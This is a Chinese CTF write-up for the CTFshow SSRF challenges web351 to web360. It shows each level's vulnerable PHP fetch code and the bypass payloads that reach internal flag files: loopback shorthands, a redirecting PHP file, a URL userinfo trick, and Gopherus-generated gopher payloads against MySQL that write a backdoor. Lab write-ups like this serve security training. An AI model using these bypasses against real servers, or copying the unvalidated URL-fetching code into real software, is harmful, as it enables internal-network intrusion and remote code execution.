---
{"dg-publish":true,"title":"CTFshow_SSRF","dg-path":"安全/靶场/CTFshow_SSRF.md","permalink":"/安全/靶场/CTFshow_SSRF/","dgPassFrontmatter":true}
---


# web351
```php
<?php  
error_reporting(0); //关闭 PHP 的错误报告 
highlight_file(__FILE__);//输出当前文件的源码并高亮显示，用于展示 PHP 代码本身。`__FILE__` 表示当前文件。  
$url=$_POST['url'];  
$ch=curl_init($url);  
curl_setopt($ch, CURLOPT_HEADER, 0);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
$result=curl_exec($ch);  
curl_close($ch);  
echo ($result);  
?>
```
这个 PHP 代码的功能是接收用户提交的 URL，然后使用 `cURL` 库访问该 URL，并输出返回的内容。


直接post发包来获取flag
```
url=http://127.0.0.1/flag.php
```

# web352

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127.0.0/')){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> 

```
它的`preg_match`检查有问题，因为没有指定要检查的字符串，导致对localhost和127.0.0的检查并没有生效。

所以可以继续post发包来获取flag
```
url=http://127.0.0.1/flag.php
```



# web353

```php
<?php  
error_reporting(0);  
highlight_file(__FILE__);  
$url=$_POST['url'];  
$x=parse_url($url);  
if($x['scheme']==='http'||$x['scheme']==='https'){  
if(!preg_match('/localhost|127\.0\.|\。/i', $url)){  
$ch=curl_init($url);  
curl_setopt($ch, CURLOPT_HEADER, 0);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
$result=curl_exec($ch);  
curl_close($ch);  
echo ($result);  
}  
else{  
    die('hacker');  
}  
}  
else{  
    die('hacker');  
}  
?>
```
有很多绕过方法
![Pasted image 20240902231158.png](/img/user/picture/Pasted%20image%2020240902231158.png)

![Pasted image 20240902231213.png](/img/user/picture/Pasted%20image%2020240902231213.png)


# web354

```php
<?php  
error_reporting(0);  
highlight_file(__FILE__);  
$url=$_POST['url'];  
$x=parse_url($url);  
if($x['scheme']==='http'||$x['scheme']==='https'){  
if(!preg_match('/localhost|1|0|。/i', $url)){  
$ch=curl_init($url);  
curl_setopt($ch, CURLOPT_HEADER, 0);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
$result=curl_exec($ch);  
curl_close($ch);  
echo ($result);  
}  
else{  
    die('hacker');  
}  
}  
else{  
    die('hacker');  
}  
?>
```

payload:
```
url=http://sudo.cc/flag.php
```




# web355

```php
<?php  
error_reporting(0);  
highlight_file(__FILE__);  
$url=$_POST['url'];  
$x=parse_url($url);  
if($x['scheme']==='http'||$x['scheme']==='https'){  
$host=$x['host'];  
if((strlen($host)<=5)){  
$ch=curl_init($url);  
curl_setopt($ch, CURLOPT_HEADER, 0);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
$result=curl_exec($ch);  
curl_close($ch);  
echo ($result);  
}  
else{  
    die('hacker');  
}  
}  
else{  
    die('hacker');  
}  
?>
```
这里要求主机名不能超过5个字符
payload:
```
url=http://127.1/flag.php
```



# web356
```php
<?php  
error_reporting(0);  
highlight_file(__FILE__);  
$url=$_POST['url'];  
$x=parse_url($url);  
if($x['scheme']==='http'||$x['scheme']==='https'){  
$host=$x['host'];  
if((strlen($host)<=3)){  
$ch=curl_init($url);  
curl_setopt($ch, CURLOPT_HEADER, 0);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
$result=curl_exec($ch);  
curl_close($ch);  
echo ($result);  
}  
else{  
    die('hacker');  
}  
}  
else{  
    die('hacker');  
}  
?>
```
又成了不能超过3个字符
payload:
```
url=http://0/flag.php
```




# web357

```php
<?php  
error_reporting(0);  
highlight_file(__FILE__);  
$url=$_POST['url'];  
$x=parse_url($url);  
if($x['scheme']==='http'||$x['scheme']==='https'){  
$ip = gethostbyname($x['host']);  
echo '</br>'.$ip.'</br>';  
if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {  
    die('ip!');  
}  
  
  
echo file_get_contents($_POST['url']);  
}  
else{  
    die('scheme');  
}  
?>
```

这一题会检测要访问的ip，如果是本地就会被过滤

这一题的解法就需要涉及到重定向
简单思路就是让它访问一个外部地址，而这个外部地址会重定向到`127.0.0.1`


```php
<?php

header("Location:http://127.0.0.1/flag.php");
```

payload:
```
url=http://<ip>
```

# web358

```php
<?php  
error_reporting(0);  
highlight_file(__FILE__);  
$url=$_POST['url'];  
$x=parse_url($url);  
if(preg_match('/^http:\/\/ctf\..*show$/i',$url)){  
    echo file_get_contents($url);  
}
```

这个正则匹配要求传入的url必须以`http://ctf.`开始，并且以`show`结尾

我们可以尝试构造如下payload：
```
http://ctf.@127.0.0.1/flag.php#show
```

`@127.0.0.1`：这是使用了 URL 的用户名和密码部分，伪装成一种用户名的方式。这里 `@` 前面的 `ctf.` 看似是域名，但 `@` 后的 `127.0.0.1` 实际上是指向的目标服务器地址。这意味着浏览器和一些服务器会将请求发送到 `127.0.0.1`。
`#show`：这是一个锚点标识符，不会被服务器解析，而是用于客户端浏览器处理。它会被忽略掉，不会对服务器请求路径产生影响。

# web359

这题提示是无密码的mysql
![Pasted image 20240903201032.png](/img/user/picture/Pasted%20image%2020240903201032.png)
我们登陆root发现会发一个这个包
![Pasted image 20240903201055.png](/img/user/picture/Pasted%20image%2020240903201055.png)
也就是会请求一个地址

我们使用gopher协议来利用mysql去进行命令执行
使用工具
https://github.com/tarunkant/Gopherus


来生成一段gopher伪协议
![Pasted image 20240903201308.png](/img/user/picture/Pasted%20image%2020240903201308.png)

接下来我们修改发送的包
![Pasted image 20240903201341.png](/img/user/picture/Pasted%20image%2020240903201341.png)
注意这里的内容是要对原本内容(带百分号的部分)进行一次url编码

![Pasted image 20240903201447.png](/img/user/picture/Pasted%20image%2020240903201447.png)
之后我们就发现我们的后门代码就被写进去了


# web360

提示说是redis，不熟，改日再弄




















